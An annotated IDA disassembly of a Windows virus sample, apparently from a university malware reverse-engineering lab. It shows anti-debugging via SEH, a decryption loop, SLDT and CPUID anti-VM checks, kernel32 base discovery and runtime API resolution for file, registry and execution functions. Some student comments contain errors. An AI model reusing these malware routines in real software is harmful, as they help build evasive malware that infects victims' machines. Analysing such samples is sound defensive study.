.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |                      License info: 48-BABB-7E64-E2                      |
.text:00401000 ; |                     Georgia Institute of Technology                     |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : 5F3C200DD06A1B610D7325B97E948564855CFB6B6C57270037EA65D1B6923C92
.text:00401000 ; Input MD5    : 491E53110DA0988C66D28B7860CEB330
.text:00401000 ; Input CRC32  : E04C1F0D
.text:00401000
.text:00401000 ; File Name   : /nethome/dgabrielyan3/Intro_to_Malware_Reverse_Eng/Lab/harulf.exe
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 4BC5AE6D (Wed Apr 14 12:00:45 2010)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00001720 (   5920.)
.text:00401000 ; Section size in file          : 00001800 (   6144.)
.text:00401000 ; Offset to raw data for section: 00000200
.text:00401000 ; Flags E0000020: Text Executable Readable Writable
.text:00401000 ; Alignment     : default
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Write/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000
.text:00401000                 public start
.text:00401000 start           proc near               ; DATA XREF: sub_401B8C+FB\u2193o
.text:00401000                                         ; sub_401B8C:loc_401DFB\u2193r
.text:00401000
.text:00401000 arg_8           = dword ptr  0Ch
.text:00401000
.text:00401000 ; FUNCTION CHUNK AT .text:00401028 SIZE 0000004F BYTES
.text:00401000 ; FUNCTION CHUNK AT .text:00401277 SIZE 000000E9 BYTES
.text:00401000
.text:00401000                 jmp     short Stuck     ; jump to the Stuck
.text:00401000 ; ---------------------------------------------------------------------------
.text:00401002 dword_401002    dd 0                    ; DATA XREF: start+2C0\u2193w
.text:00401002                                         ; start+34F\u2193r
.text:00401006 dword_401006    dd 0                    ; DATA XREF: start+2C6\u2193w
.text:00401006                                         ; start:loc_401355\u2193r
.text:0040100A ; ---------------------------------------------------------------------------
.text:0040100A
.text:0040100A Stuck:                                  ; CODE XREF: start\u2191j
.text:0040100A                 call    Here            ; jump to anti-debuhg routine
.text:0040100F                 jmp     short getDelta  ; jump to the code that alllegedly is not being debugged
.text:0040100F start           endp ; sp-analysis failed
.text:0040100F
.text:00401011
.text:00401011 ; =============== S U B R O U T I N E =======================================
.text:00401011
.text:00401011
.text:00401011 Here            proc near               ; CODE XREF: start:Stuck\u2191p
.text:00401011                                         ; DATA XREF: start+3B\u2193o
.text:00401011                 mov     eax, [esp+0]    ; grab the address of the getDelta jump
.text:00401014                 push    eax             ; save it
.text:00401015                 push    large dword ptr fs:0 ; save the old SEH (Structured Exception handeling) pointer
.text:0040101C                 mov     large fs:0, esp ; overwrite the SEH with jump to getDelta handeling
.text:00401023                 xor     eax, eax        ; eax =0
.text:00401025                 mov     eax, [eax]      ; causes null exception
.text:00401027                 retn
.text:00401027 Here            endp ; sp-analysis failed
.text:00401027
.text:00401028 ; ---------------------------------------------------------------------------
.text:00401028 ; START OF FUNCTION CHUNK FOR start
.text:00401028
.text:00401028 getDelta:                               ; CODE XREF: start+F\u2191j
.text:00401028                 mov     eax, [esp+arg_8]
.text:0040102C                 mov     esp, [eax+0C4h]
.text:00401032                 pop     large dword ptr fs:0 ; Restore the SEH
.text:00401039                 pop     edx
.text:0040103A                 pop     ebp
.text:0040103B                 sub     ebp, offset Here
.text:00401041                 add     ebp, 2
.text:00401044                 cmp     ebp, 0          ; if ebp is 0, the virus is decrypted
.text:00401047                 jz      short endDecrypt ; skip the decryption loop
.text:00401049                 mov     esi, offset endDecrypt ; grabbing the beggining of the actual virus code before decryption and it is also goingto be desination for decryption
.text:0040104E                 add     esi, ebp        ; adding the delta offset
.text:00401050                 mov     ecx, 1720h      ; Virus size (num of bytes to process)
.text:00401055                 sub     ecx, 72h ; 'r'  ; minus the stub size
.text:0040105B
.text:0040105B SecondStageDecryption:                  ; CODE XREF: start+70\u2193j
.text:0040105B                 push    ecx             ; save the number of bytes
.text:0040105C                 mov     cx, [esi]       ; grab 2 bytes from the virus
.text:0040105F                 ror     ch, cl          ; rotating 'ch' right 'cl' number of times
.text:00401061                 xchg    ch, cl          ; swap them
.text:00401063                 mov     [esi], cx       ; save it back into the virus
.text:00401066                 add     esi, 2          ; increment esi to the next bytes (skipping the 2 newly vetted bytes)
.text:00401069                 pop     ecx             ; grab the num of bytes
.text:0040106A                 sub     ecx, 2          ; decremeant it by 2
.text:0040106D                 cmp     ecx, 0          ; check if 0 else, there is more to decrypt
.text:00401070                 ja      short SecondStageDecryption
.text:00401072
.text:00401072 endDecrypt:                             ; CODE XREF: start+47\u2191j
.text:00401072                                         ; DATA XREF: start+49\u2191o
.text:00401072                 jmp     fisrtVM         ; continue
.text:00401072 ; END OF FUNCTION CHUNK FOR start
.text:00401072 ; ---------------------------------------------------------------------------
.text:00401077 byte_401077     db 0                    ; DATA XREF: start+2D4\u2193o
.text:00401077                                         ; sub_401B3B+1B\u2193o ...
.text:00401078                 dd 7Fh dup(0)
.text:00401274                 db 3 dup(0)
.text:00401277 ; ---------------------------------------------------------------------------
.text:00401277 ; START OF FUNCTION CHUNK FOR start
.text:00401277
.text:00401277 fisrtVM:                                ; CODE XREF: start:endDecrypt\u2191j
.text:00401277                 xor     ebx, ebx        ; ebx = 0
.text:00401279                 mov     ebx, esp        ; ebx = esp
.text:0040127B                 sldt    word ptr [ebx+8] ; Local Discripto table location loaded into stack
.text:0040127F                 xor     eax, eax        ; eax = 0
.text:00401281                 mov     eax, [ebx+8]    ; eax contains the LDT location, it's 0 if it's native but sime other value when in a VM
.text:00401284                 or      eax, eax        ; check if 0
.text:00401286                 jnz     short secondVM  ; if not 0, we jump coz we are in a VM. (Old fashioned VM check)
.text:00401288                 retn
.text:00401289 ; ---------------------------------------------------------------------------
.text:00401289
.text:00401289 secondVM:                               ; CODE XREF: start+286\u2191j
.text:00401289                 xor     eax, eax        ; eax = 0
.text:0040128B                 cpuid                   ; getting CPUID with eax = 0 as argument and returns max input which is indication of what prcessor is in use
.text:0040128D                 push    eax             ; save
.text:0040128E                 xor     eax, eax        ; eax = 0
.text:00401290                 inc     eax             ; eax = 1
.text:00401291                 cpuid                   ; cpuid called with argument 1. Returns cpu signature into eax, feature flags in registers EDX and ECX, and additional feature info in register EBX. The 31st bit in ECX indicates whether on hypervisor or not.
.text:00401293                 pop     ebx             ; ebx = max input size
.text:00401294                 xor     eax, ebx        ; xor the signature with the manufacturer indication
.text:00401296                 or      eax, eax        ; check if result is 0
.text:00401298                 jnz     short continue  ; take the jump only is it's not 0 aka not in a VM (wierd anti VM cehck)
.text:0040129A                 retn
.text:0040129B ; ---------------------------------------------------------------------------
.text:0040129B
.text:0040129B continue:                               ; CODE XREF: start+298\u2191j
.text:0040129B                 call    get_kernel
.text:004012A0                 call    find_main_api
.text:004012A5                 call    find_other_apis
.text:004012AA                 call    polyizer
.text:004012AF ; ---------------------------------------------------------------------------
.text:004012AF                 call    getting_messagebox_api
.text:004012B4                 mov     ebx, ss:dword_401A22[ebp]
.text:004012BA                 mov     edx, ss:dword_401A1E[ebp]
.text:004012C0                 mov     ss:dword_401002[ebp], ebx
.text:004012C6                 mov     ss:dword_401006[ebp], edx
.text:004012CC                 or      ebp, ebp
.text:004012CE                 jz      short loc_4012E3
.text:004012D0                 add     edx, ebx
.text:004012D2                 mov     edi, edx
.text:004012D4                 lea     esi, byte_401077[ebp]
.text:004012DA                 mov     ecx, 200h
.text:004012DF                 rep movsb
.text:004012E1                 jmp     short loc_4012FA
.text:004012E3 ; ---------------------------------------------------------------------------
.text:004012E3
.text:004012E3 loc_4012E3:                             ; CODE XREF: start+2CE\u2191j
.text:004012E3                 call    loc_4012F3
.text:004012E8                 jnb     short loc_40134B
.text:004012EA                 insd
.text:004012EB                 jo      short near ptr loc_401355+4
.text:004012ED                 db      65h, 2Eh, 65h
.text:004012ED                 js      short near ptr loc_401355+2
.text:004012ED ; ---------------------------------------------------------------------------
.text:004012F2                 db    0
.text:004012F3 ; ---------------------------------------------------------------------------
.text:004012F3
.text:004012F3 loc_4012F3:                             ; CODE XREF: start:loc_4012E3\u2191p
.text:004012F3                 pop     eax
.text:004012F4                 call    sub_401B8C
.text:004012F9                 retn
.text:004012FA ; ---------------------------------------------------------------------------
.text:004012FA
.text:004012FA loc_4012FA:                             ; CODE XREF: start+2E1\u2191j
.text:004012FA                 mov     ecx, 0FFh
.text:004012FF                 call    sub_402446
.text:00401304                 mov     ss:dword_4018C2[ebp], eax
.text:0040130A                 call    sub_401A5A
.text:0040130F                 call    sub_4023A1
.text:00401314                 or      eax, eax
.text:00401316                 jz      short loc_401332
.text:00401318                 call    sub_4023F4
.text:0040131D                 call    sub_402029
.text:00401322                 call    sub_40224D
.text:00401327                 call    sub_40224D
.text:0040132C                 call    sub_402279
.text:00401331                 retn
.text:00401332 ; ---------------------------------------------------------------------------
.text:00401332
.text:00401332 loc_401332:                             ; CODE XREF: start+316\u2191j
.text:00401332                 call    sub_401EB4
.text:00401337                 call    sub_402029
.text:0040133C                 call    sub_40224D
.text:00401341                 call    sub_40224D
.text:00401346                 call    sub_402279
.text:0040134B
.text:0040134B loc_40134B:                             ; CODE XREF: start+2E8\u2191j
.text:0040134B                 or      ebp, ebp
.text:0040134D                 jz      short locret_40135F
.text:0040134F                 mov     eax, ss:dword_401002[ebp]
.text:00401355
.text:00401355 loc_401355:                             ; CODE XREF: start+2ED\u2191j
.text:00401355                                         ; start+2EB\u2191j
.text:00401355                 mov     ebx, ss:dword_401006[ebp]
.text:0040135B                 add     eax, ebx
.text:0040135D                 jmp     eax
.text:0040135F ; ---------------------------------------------------------------------------
.text:0040135F
.text:0040135F locret_40135F:                          ; CODE XREF: start+34D\u2191j
.text:0040135F                 retn
.text:0040135F ; END OF FUNCTION CHUNK FOR start
.text:00401360
.text:00401360 ; =============== S U B R O U T I N E =======================================
.text:00401360
.text:00401360
.text:00401360 getting_messagebox_api proc near        ; CODE XREF: start+2AF\u2191p
.text:00401360                 lea     eax, aUser32Dll[ebp] ; "user32.dll"
.text:00401366                 push    eax
.text:00401367                 call    ss:dword_40177B[ebp]
.text:0040136D                 mov     ss:dword_4013DC[ebp], eax
.text:00401373                 lea     eax, (loc_4013BE+3)[ebp]
.text:00401379                 push    eax
.text:0040137A                 push    ss:dword_4013DC[ebp]
.text:00401380                 call    ss:dword_401449[ebp]
.text:00401386                 mov     ss:dword_4013CD[ebp], eax
.text:0040138C                 retn
.text:0040138C getting_messagebox_api endp ; sp-analysis failed
.text:0040138C
.text:0040138D ; ---------------------------------------------------------------------------
.text:0040138D ; START OF FUNCTION CHUNK FOR find_main_api
.text:0040138D ;   ADDITIONAL PARENT FUNCTION sub_401813
.text:0040138D ;   ADDITIONAL PARENT FUNCTION sub_40188E
.text:0040138D ;   ADDITIONAL PARENT FUNCTION sub_401B8C
.text:0040138D
.text:0040138D loc_40138D:                             ; CODE XREF: find_main_api+5C\u2193j
.text:0040138D                                         ; find_main_api+FF\u2193j ...
.text:0040138D                 push    0
.text:0040138F                 call    dword_401777
.text:00401395                 ja      short loc_4013CA
.text:00401397                 xor     ch, [edi]
.text:00401399                 dec     eax
.text:0040139A                 popa
.text:0040139B                 jb      short near ptr loc_40140D+5
.text:0040139D                 insb
.text:0040139E                 db      66h
.text:0040139E                 and     [ebx+6Fh], ah
.text:004013A2                 db      64h, 65h
.text:004013A2                 and     fs:[edx+79h], ah
.text:004013A8                 and     [esi+61h], ah
.text:004013AB                 imul    esp, [ebp+64h], 6Dh ; 'm'
.text:004013AF                 outsb
.text:004013B0                 db      64h, 65h
.text:004013B0                 and     fs:[eax], eax
.text:004013B5                 inc     ebp
.text:004013B6                 xor     [esi+2Dh], al
.text:004013B9                 push    eax
.text:004013BA                 push    edx
.text:004013BB                 outsd
.text:004013BC                 push    65h ; 'e'
.text:004013BE
.text:004013BE loc_4013BE:                             ; DATA XREF: getting_messagebox_api+13\u2191o
.text:004013BE                 imul    esi, [eax+eax+4Dh], 65h ; 'e'
.text:004013C3                 jnb     short near ptr dword_401436+2
.text:004013C5                 popa
.text:004013C6                 db      67h, 65h
.text:004013C6                 inc     edx
.text:004013C9                 outsd
.text:004013CA
.text:004013CA loc_4013CA:                             ; CODE XREF: find_main_api-7F\u2191j
.text:004013CA                 js      short loc_40140D
.text:004013CA ; END OF FUNCTION CHUNK FOR find_main_api
.text:004013CA ; ---------------------------------------------------------------------------
.text:004013CC                 db 0
.text:004013CD dword_4013CD    dd 0                    ; DATA XREF: getting_messagebox_api+26\u2191w
.text:004013CD                                         ; sub_401EB4+1C\u2193r
.text:004013D1 aUser32Dll      db 'user32.dll',0       ; DATA XREF: getting_messagebox_api\u2191o
.text:004013DC dword_4013DC    dd 0                    ; DATA XREF: getting_messagebox_api+D\u2191w
.text:004013DC                                         ; getting_messagebox_api+1A\u2191r
.text:004013E0                 dd 2 dup(0)
.text:004013E8
.text:004013E8 ; =============== S U B R O U T I N E =======================================
.text:004013E8
.text:004013E8
.text:004013E8 get_kernel      proc near               ; CODE XREF: start:continue\u2191p
.text:004013E8
.text:004013E8 arg_0           = dword ptr  4
.text:004013E8
.text:004013E8                 jmp     short loc_4013EE
.text:004013E8 ; ---------------------------------------------------------------------------
.text:004013EA dword_4013EA    dd 0                    ; DATA XREF: get_kernel:loc_40140D\u2193w
.text:004013EA                                         ; find_main_api:loc_401462\u2193r ...
.text:004013EE ; ---------------------------------------------------------------------------
.text:004013EE
.text:004013EE loc_4013EE:                             ; CODE XREF: get_kernel\u2191j
.text:004013EE                 mov     ecx, [esp+arg_0]
.text:004013F2
.text:004013F2 loc_4013F2:                             ; CODE XREF: get_kernel+16\u2193j
.text:004013F2                                         ; get_kernel+1C\u2193j ...
.text:004013F2                 xor     edx, edx
.text:004013F4                 dec     ecx
.text:004013F5                 mov     dx, [ecx+3Ch]
.text:004013F9                 test    dx, 0F800h
.text:004013FE                 jnz     short loc_4013F2
.text:00401400                 cmp     ecx, [edx+ecx+34h]
.text:00401404                 jnz     short loc_4013F2
.text:00401406                 cmp     word ptr [ecx], 5A4Dh
.text:0040140B                 jnz     short loc_4013F2
.text:0040140D
.text:0040140D loc_40140D:                             ; CODE XREF: find_main_api:loc_4013CA\u2191j
.text:0040140D                                         ; find_main_api-79\u2191j
.text:0040140D                 mov     ss:dword_4013EA[ebp], ecx
.text:00401413                 retn
.text:00401413 get_kernel      endp
.text:00401413
.text:00401414
.text:00401414 ; =============== S U B R O U T I N E =======================================
.text:00401414
.text:00401414
.text:00401414 find_main_api   proc near               ; CODE XREF: start+2A0\u2191p
.text:00401414
.text:00401414 ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:00401414
.text:00401414                 jmp     short loc_401462
.text:00401414 ; ---------------------------------------------------------------------------
.text:00401416 dword_401416    dd 0                    ; DATA XREF: find_main_api+62\u2193w
.text:0040141A dword_40141A    dd 0                    ; DATA XREF: find_main_api+76\u2193w
.text:0040141E dword_40141E    dd 0                    ; DATA XREF: find_main_api+6F\u2193w
.text:00401422                 align 4
.text:00401424                 db 2 dup(0)
.text:00401426 dword_401426    dd 0                    ; DATA XREF: find_main_api+94\u2193w
.text:0040142A dword_40142A    dd 0                    ; DATA XREF: find_main_api+A3\u2193w
.text:0040142A                                         ; find_main_api+11E\u2193r
.text:0040142E dword_40142E    dd 0                    ; DATA XREF: find_main_api+C1\u2193w
.text:0040142E                                         ; find_main_api+10E\u2193r
.text:00401432 dword_401432    dd 0                    ; DATA XREF: find_main_api+B2\u2193w
.text:00401432                                         ; find_main_api+CB\u2193r
.text:00401436 dword_401436    dd 0                    ; CODE XREF: find_main_api-51\u2191j
.text:00401436                                         ; DATA XREF: find_main_api+8B\u2193w
.text:0040143A aGetprocaddress db 'GetProcAddress',0   ; DATA XREF: find_main_api+D1\u2193o
.text:00401449 dword_401449    dd 0                    ; DATA XREF: getting_messagebox_api+20\u2191r
.text:00401449                                         ; find_main_api+12E\u2193w ...
.text:0040144D aGetmodulehandl db 'GetModuleHandleA',0
.text:0040145E                 align 10h
.text:00401460                 db 2 dup(0)
.text:00401462 ; ---------------------------------------------------------------------------
.text:00401462
.text:00401462 loc_401462:                             ; CODE XREF: find_main_api\u2191j
.text:00401462                 mov     edi, ss:dword_4013EA[ebp]
.text:00401468                 add     edi, [edi+3Ch]
.text:0040146B                 cmp     word ptr [edi], 4550h
.text:00401470                 jnz     loc_40138D
.text:00401476                 mov     ss:dword_401416[ebp], edi
.text:0040147C                 mov     eax, [edi+78h]
.text:0040147F                 push    eax
.text:00401480                 mov     eax, [edi+7Ch]
.text:00401483                 mov     ss:dword_40141E[ebp], eax
.text:00401489                 pop     eax
.text:0040148A                 mov     ss:dword_40141A[ebp], eax
.text:00401490                 add     eax, ss:dword_4013EA[ebp]
.text:00401496                 mov     edx, [eax+10h]
.text:00401499                 add     edx, ss:dword_4013EA[ebp]
.text:0040149F                 mov     ss:dword_401436[ebp], edx
.text:004014A5                 mov     edx, [eax+18h]
.text:004014A8                 mov     ss:dword_401426[ebp], edx
.text:004014AE                 mov     edx, [eax+1Ch]
.text:004014B1                 add     edx, ss:dword_4013EA[ebp]
.text:004014B7                 mov     ss:dword_40142A[ebp], edx
.text:004014BD                 mov     edx, [eax+20h]
.text:004014C0                 add     edx, ss:dword_4013EA[ebp]
.text:004014C6                 mov     ss:dword_401432[ebp], edx
.text:004014CC                 mov     edx, [eax+24h]
.text:004014CF                 add     edx, ss:dword_4013EA[ebp]
.text:004014D5                 mov     ss:dword_40142E[ebp], edx
.text:004014DB                 xor     edx, edx
.text:004014DD                 xor     eax, eax
.text:004014DF                 mov     eax, ss:dword_401432[ebp]
.text:004014E5                 mov     edx, offset aGetprocaddress ; "GetProcAddress"
.text:004014EA                 add     edx, ebp
.text:004014EC                 xor     ecx, ecx
.text:004014EE                 mov     edi, [eax]
.text:004014F0                 add     edi, ss:dword_4013EA[ebp]
.text:004014F6
.text:004014F6 loc_4014F6:                             ; CODE XREF: find_main_api+FD\u2193j
.text:004014F6                 mov     esi, edx
.text:004014F8
.text:004014F8 loc_4014F8:                             ; CODE XREF: find_main_api+EC\u2193j
.text:004014F8                 cmpsb
.text:004014F9                 jnz     short loc_401502
.text:004014FB                 cmp     byte ptr [edi], 0
.text:004014FE                 jz      short loc_401518
.text:00401500                 jmp     short loc_4014F8
.text:00401502 ; ---------------------------------------------------------------------------
.text:00401502
.text:00401502 loc_401502:                             ; CODE XREF: find_main_api+E5\u2191j
.text:00401502                 add     cx, 1
.text:00401506                 add     eax, 4
.text:00401509                 mov     edi, [eax]
.text:0040150B                 add     edi, ss:dword_4013EA[ebp]
.text:00401511                 jmp     short loc_4014F6
.text:00401513 ; ---------------------------------------------------------------------------
.text:00401513                 jmp     loc_40138D
.text:00401518 ; ---------------------------------------------------------------------------
.text:00401518
.text:00401518 loc_401518:                             ; CODE XREF: find_main_api+EA\u2191j
.text:00401518                 mov     edi, [eax]
.text:0040151A                 add     edi, ss:dword_4013EA[ebp]
.text:00401520                 shl     ecx, 1
.text:00401522                 mov     eax, ss:dword_40142E[ebp]
.text:00401528                 add     eax, ecx
.text:0040152A                 xor     ecx, ecx
.text:0040152C                 mov     cx, [eax]
.text:0040152F                 shl     ecx, 2
.text:00401532                 mov     eax, ss:dword_40142A[ebp]
.text:00401538                 add     eax, ecx
.text:0040153A                 mov     eax, [eax]
.text:0040153C                 add     eax, ss:dword_4013EA[ebp]
.text:00401542                 mov     ss:dword_401449[ebp], eax
.text:00401548                 retn
.text:00401548 find_main_api   endp ; sp-analysis failed
.text:00401548
.text:00401549 ; ---------------------------------------------------------------------------
.text:00401549                 mov     eax, 0
.text:0040154E                 retn
.text:0040154F
.text:0040154F ; =============== S U B R O U T I N E =======================================
.text:0040154F
.text:0040154F ; Attributes: thunk
.text:0040154F
.text:0040154F find_other_apis proc near               ; CODE XREF: start+2A5\u2191p
.text:0040154F                 jmp     sub_401813
.text:0040154F find_other_apis endp
.text:0040154F
.text:0040154F ; ---------------------------------------------------------------------------
.text:00401554 dword_401554    dd 0                    ; DATA XREF: sub_401813+14\u2193w
.text:00401554                                         ; sub_401813+35\u2193w ...
.text:00401558 aAdvapi32Dll    db 'advapi32.dll',0     ; DATA XREF: sub_401813+1F\u2193o
.text:00401565                 align 4
.text:00401568                 db 0
.text:00401569 aShell32Dll     db 'shell32.dll',0      ; DATA XREF: sub_401813+4E\u2193o
.text:00401575                 align 4
.text:00401578                 db 0
.text:00401579 aGetlogicaldriv db 'GetLogicalDrives',0 ; DATA XREF: sub_401813\u2193o
.text:0040158A aCreatefilea    db 'CreateFileA',0
.text:00401596 aClosehandle    db 'CloseHandle',0
.text:004015A2 aWritefile      db 'WriteFile',0
.text:004015AC aReadfile       db 'ReadFile',0
.text:004015B5 aBeginupdateres db 'BeginUpdateResourceA',0
.text:004015CA aUpdateresource db 'UpdateResourceA',0
.text:004015DA aEndupdateresou db 'EndUpdateResourceA',0
.text:004015ED aFindresourcea  db 'FindResourceA',0
.text:004015FB aGetfilesize    db 'GetFileSize',0
.text:00401607 aGlobalalloc    db 'GlobalAlloc',0
.text:00401613 aSetfilepointer db 'SetFilePointer',0
.text:00401622 aGetversionexa  db 'GetVersionExA',0
.text:00401630 aGetdateformata db 'GetDateFormatA',0
.text:0040163F aSleep          db 'Sleep',0
.text:00401645 aFindfirstfilea db 'FindFirstFileA',0
.text:00401654 aFindnextfilea  db 'FindNextFileA',0
.text:00401662 aFindclose      db 'FindClose',0
.text:0040166C aGetlasterror   db 'GetLastError',0
.text:00401679 aExitprocess    db 'ExitProcess',0
.text:00401685 aLoadlibrarya   db 'LoadLibraryA',0
.text:00401692 aFreelibrary    db 'FreeLibrary',0
.text:0040169E aExpandenvironm db 'ExpandEnvironmentStringsA',0
.text:004016B8 aGetmodulefilen db 'GetModuleFileNameA',0
.text:004016CB aCopyfilea      db 'CopyFileA',0
.text:004016D5 aGetcurrentdire db 'GetCurrentDirectoryA',0
.text:004016EA aSetcurrentdire db 'SetCurrentDirectoryA',0
.text:004016FF aGetfileattribu db 'GetFileAttributesA',0
.text:00401712 aGettickcount   db 'GetTickCount',0
.text:0040171F aWinexec        db 'WinExec',0
.text:00401727                 db 0FFh
.text:00401728                 db 3 dup(0)
.text:0040172B dword_40172B    dd 0                    ; DATA XREF: sub_401813+5\u2193o
.text:0040172B                                         ; sub_402279\u2193r
.text:0040172F dword_40172F    dd 0                    ; DATA XREF: sub_401B8C+19C\u2193r
.text:0040172F                                         ; sub_40230C+5F\u2193r
.text:00401733 dword_401733    dd 0                    ; DATA XREF: sub_40230C+7E\u2193r
.text:00401737 dword_401737    dd 0                    ; DATA XREF: sub_401B8C+2CF\u2193r
.text:00401737                                         ; sub_40230C+77\u2193r
.text:0040173B dword_40173B    dd 0                    ; DATA XREF: sub_401B8C+1FA\u2193r
.text:0040173F dword_40173F    dd 0                    ; DATA XREF: sub_401B8C+144\u2193r
.text:00401743 dword_401743    dd 0                    ; DATA XREF: sub_401B8C+168\u2193r
.text:00401747 dword_401747    dd 0                    ; DATA XREF: sub_401B8C+17A\u2193r
.text:0040174B dword_40174B    dd 0                    ; DATA XREF: sub_401B8C+2D\u2193r
.text:0040174F dword_40174F    dd 0                    ; DATA XREF: sub_401B8C+1B3\u2193r
.text:00401753 dword_401753    dd 0                    ; DATA XREF: sub_401A5A+8\u2193r
.text:00401753                                         ; sub_401B8C+E7\u2193r ...
.text:00401757 dword_401757    dd 0                    ; DATA XREF: sub_401B8C+2AD\u2193r
.text:0040175B                 align 4
.text:0040175C                 db 3 dup(0)
.text:0040175F dword_40175F    dd 0                    ; DATA XREF: sub_402029+15\u2193r
.text:00401763 dword_401763    dd 0                    ; DATA XREF: sub_402029+61\u2193r
.text:00401767 dword_401767    dd 0                    ; DATA XREF: sub_401A5A+2A\u2193r
.text:0040176B dword_40176B    dd 0                    ; DATA XREF: sub_401A5A+73\u2193r
.text:0040176F dword_40176F    dd 0                    ; DATA XREF: sub_401A5A+B4\u2193r
.text:00401773 dword_401773    dd 0                    ; DATA XREF: sub_401A5A+79\u2193r
.text:00401777 dword_401777    dd 0                    ; DATA XREF: find_main_api-85\u2191r
.text:0040177B dword_40177B    dd 0                    ; DATA XREF: getting_messagebox_api+7\u2191r
.text:0040177B                                         ; sub_401813+27\u2193r ...
.text:0040177F dword_40177F    dd 0                    ; DATA XREF: sub_401B8C+DA\u2193r
.text:00401783                 align 4
.text:00401784                 db 3 dup(0)
.text:00401787 dword_401787    dd 0                    ; DATA XREF: sub_4023A1+20\u2193r
.text:0040178B dword_40178B    dd 0                    ; DATA XREF: sub_40224D+14\u2193r
.text:0040178B                                         ; sub_40230C+45\u2193r
.text:0040178F dword_40178F    dd 0                    ; DATA XREF: sub_40230C+1E\u2193r
.text:00401793 dword_401793    dd 0                    ; DATA XREF: sub_40230C+2B\u2193r
.text:00401793                                         ; sub_40230C+8A\u2193r
.text:00401797                 align 4
.text:00401798                 db 3 dup(0)
.text:0040179B dword_40179B    dd 0                    ; DATA XREF: sub_402446+2\u2193r
.text:0040179F dword_40179F    dd 0                    ; DATA XREF: sub_402029+70\u2193r
.text:0040179F                                         ; sub_4023F4+3F\u2193r
.text:004017A3                 db 0FFh
.text:004017A4                 db 3 dup(0)
.text:004017A7 aRegopenkeyexa  db 'RegOpenKeyExA',0    ; DATA XREF: sub_401813+3B\u2193o
.text:004017B5 aRegqueryvaluee db 'RegQueryValueExA',0
.text:004017C6 aRegsetvalueexa db 'RegSetValueExA',0
.text:004017D5 aRegclosekey    db 'RegCloseKey',0
.text:004017E1                 db 0FFh, 2 dup(0)
.text:004017E4                 db 0
.text:004017E5 dword_4017E5    dd 0                    ; DATA XREF: sub_401813+40\u2193o
.text:004017E5                                         ; sub_401F45+17\u2193r
.text:004017E9                 align 4
.text:004017EC                 db 0
.text:004017ED dword_4017ED    dd 0                    ; DATA XREF: sub_401F45+44\u2193r
.text:004017F1 dword_4017F1    dd 0                    ; DATA XREF: sub_401F45+50\u2193r
.text:004017F5                 db 0FFh, 2 dup(0)
.text:004017F8                 db 0
.text:004017F9 aIsuseranadmin  db 'IsUserAnAdmin',0    ; DATA XREF: sub_401813+69\u2193o
.text:00401807                 db 0FFh
.text:00401808                 db 3 dup(0)
.text:0040180B dword_40180B    dd 0                    ; DATA XREF: sub_401813+6F\u2193o
.text:0040180B                                         ; sub_401EB4\u2193r
.text:0040180F                 db 0FFh
.text:00401810                 db 3 dup(0)
.text:00401813
.text:00401813 ; =============== S U B R O U T I N E =======================================
.text:00401813
.text:00401813
.text:00401813 sub_401813      proc near               ; CODE XREF: find_other_apis\u2191j
.text:00401813
.text:00401813 ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:00401813
.text:00401813                 mov     esi, offset aGetlogicaldriv ; "GetLogicalDrives"
.text:00401818                 mov     edi, offset dword_40172B
.text:0040181D                 add     esi, ebp
.text:0040181F                 add     edi, ebp
.text:00401821                 push    ss:dword_4013EA[ebp]
.text:00401827                 pop     ss:dword_401554[ebp]
.text:0040182D                 call    sub_40188E
.text:00401832                 mov     eax, offset aAdvapi32Dll ; "advapi32.dll"
.text:00401837                 add     eax, ebp
.text:00401839                 push    eax
.text:0040183A                 call    ss:dword_40177B[ebp]
.text:00401840                 or      eax, eax
.text:00401842                 jz      loc_40138D
.text:00401848                 mov     ss:dword_401554[ebp], eax
.text:0040184E                 mov     esi, offset aRegopenkeyexa ; "RegOpenKeyExA"
.text:00401853                 mov     edi, offset dword_4017E5
.text:00401858                 add     esi, ebp
.text:0040185A                 add     edi, ebp
.text:0040185C                 call    sub_40188E
.text:00401861                 lea     eax, aShell32Dll[ebp] ; "shell32.dll"
.text:00401867                 push    eax
.text:00401868                 call    ss:dword_40177B[ebp]
.text:0040186E                 or      eax, eax
.text:00401870                 jz      loc_40138D
.text:00401876                 mov     ss:dword_401554[ebp], eax
.text:0040187C                 lea     esi, aIsuseranadmin[ebp] ; "IsUserAnAdmin"
.text:00401882                 lea     edi, dword_40180B[ebp]
.text:00401888                 call    sub_40188E
.text:0040188D                 retn
.text:0040188D sub_401813      endp ; sp-analysis failed
.text:0040188D
.text:0040188E
.text:0040188E ; =============== S U B R O U T I N E =======================================
.text:0040188E
.text:0040188E
.text:0040188E sub_40188E      proc near               ; CODE XREF: sub_401813+1A\u2191p
.text:0040188E                                         ; sub_401813+49\u2191p ...
.text:0040188E
.text:0040188E ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:0040188E
.text:0040188E                 mov     eax, esi
.text:00401890                 push    eax
.text:00401891                 push    ss:dword_401554[ebp]
.text:00401897                 call    ss:dword_401449[ebp]
.text:0040189D                 or      eax, eax
.text:0040189F                 jz      loc_40138D
.text:004018A5                 mov     [edi], eax
.text:004018A7
.text:004018A7 loc_4018A7:                             ; CODE XREF: sub_40188E+1D\u2193j
.text:004018A7                 inc     esi
.text:004018A8                 cmp     byte ptr [esi], 0
.text:004018AB                 jnz     short loc_4018A7
.text:004018AD                 inc     esi
.text:004018AE                 add     edi, 4
